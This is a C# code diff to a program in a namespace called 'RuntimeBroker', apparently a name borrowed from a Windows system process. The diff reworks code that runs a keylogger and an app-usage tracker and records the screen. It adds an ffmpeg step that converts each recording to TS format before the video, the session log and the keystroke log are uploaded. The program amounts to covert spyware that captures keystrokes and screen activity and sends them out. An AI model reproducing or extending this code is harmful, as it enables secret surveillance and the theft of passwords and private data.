@@ -75,19 +75,38 @@ namespace RuntimeBroker
         {
             try
             {
-                _ = Task.Run(() =>
+                try
+                {
+                    _ = Task.Run(() =>
+                    {
+
+                        KeyLogger.Run();
+
+                    });
+
+
+                }
+                catch (Exception ex)
+                {
+                    Log(ex.ToString());
+                }
+
+                try
                 {
 
-                    KeyLogger.Run();
+                    _ = Task.Run(() =>
+                    {
 
-                });
+                        _ = AppTimeTrack.Run();
 
-                _ = Task.Run(() =>
+                    });
+                }
+                catch (Exception ex)
                 {
+                    Log(ex.ToString());
+                }
 
-                    _ = AppTimeTrack.Run();
-
-                });
+                await Task.Delay(5000);
 
                 _ = Task.Run(async () =>
                 {
@@ -109,7 +128,7 @@ namespace RuntimeBroker
                             KeyLogger.WriteNewLogSession(now);
                             AppTimeTrack.SetNewAppTrack(now);
 
-                            string fileName = Path.GetTempFileName().Replace(".tmp", ".mp4");
+                            string fileName = Path.GetTempFileName().Replace(".tmp", $".{videoFormatFile}");
 
                             _rec.Record(fileName);
 
@@ -124,12 +143,15 @@ namespace RuntimeBroker
                             FileInfo file = new FileInfo(fileName);
                             file.MoveTo(videoPath);
 
-                            Trace.WriteLine("Record:" + videoPath);
+                            Trace.WriteLine("Save vid");
 
                             var keyLogJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserAction.json");
                             var appsJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserSession.json");
 
-                            UploadVideos(now, videoPath, appsJsonPath, keyLogJsonPath);
+                            var videoTsFile = videoPath.Replace($".{videoFormatFile}", ".ts");
+
+                            ConvertMp4ToTs(videoPath, videoTsFile);
+                            UploadVideos(now, videoTsFile, appsJsonPath, keyLogJsonPath);
                         }
                         catch (Exception ex)
                         {
@@ -287,6 +309,42 @@ namespace RuntimeBroker
                     KeyLogsPath = keyLogJsonPath,
                 });
                 Console.WriteLine("Add to queue: " + SessionRecorders.Count);
+            }
+        }
+
+        private bool ConvertMp4ToTs(string inputFilePath, string outputFilePath)
+        {
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = "ffmpeg",
+                    Arguments = $"-i \"{inputFilePath}\" -c:v copy -c:a aac -b:a 128k \"{outputFilePath}\"", // Copy video stream and re-encode audio to AAC
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                using (Process process = new Process())
+                {
+                    process.StartInfo = startInfo;
+                    process.OutputDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine(e.Data); };
+                    process.ErrorDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine(e.Data); };
+
+                    process.Start();
+                    process.BeginOutputReadLine();
+                    process.BeginErrorReadLine();
+
+                    process.WaitForExit();
+
+                    return process.ExitCode == 0;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+                return false;
             }
         }
 
